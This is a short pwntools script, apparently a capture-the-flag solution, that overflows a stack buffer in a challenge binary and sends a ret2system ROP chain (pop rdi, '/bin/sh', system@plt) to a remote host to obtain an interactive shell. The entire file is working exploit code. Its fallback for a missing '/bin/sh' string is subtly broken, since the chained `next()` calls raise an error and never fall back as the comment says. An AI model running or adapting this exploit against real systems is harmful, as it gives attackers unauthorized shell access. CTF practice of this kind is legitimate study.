from pwn import *

# Remote connection setup
host = 'chall.c00k3d.xyz'
port = 10003

def exploit():
    try:
        # Set up the binary context
        elf = context.binary = ELF('./chall/chall')
        rop = ROP(elf)

        # Calculate offset (confirmed working)
        offset = 40  # 32 (buffer) + 8 (RBP)

        # Find necessary addresses
        system_addr = elf.plt['system']
        binsh_addr = next(elf.search(b'/bin/sh\x00')) or next(elf.search(b'sh\x00'))
        
        if not binsh_addr:
            # If no /bin/sh in binary, we'll use echo
            binsh_addr = next(elf.search(b'echo\x00'))
        
        log.info(f"system@plt: {hex(system_addr)}")
        log.info(f"/bin/sh string: {hex(binsh_addr)}")

        # Build ROP chain
        payload = flat(
            b'A' * offset,
            rop.ret.address,       # Stack alignment
            rop.rdi.address,       # Pop RDI gadget
            binsh_addr,            # Arg: /bin/sh
            system_addr            # Call system()
        )

        # Connect to remote
        io = remote(host, port)
        
        # Send payload
        io.sendlineafter(b"Enter Data - ", payload)
        
        # Get interactive session
        io.interactive()

    except Exception as e:
        log.error(f"Error: {e}")
        if 'io' in locals():
            io.close()

if __name__ == "__main__":
    exploit()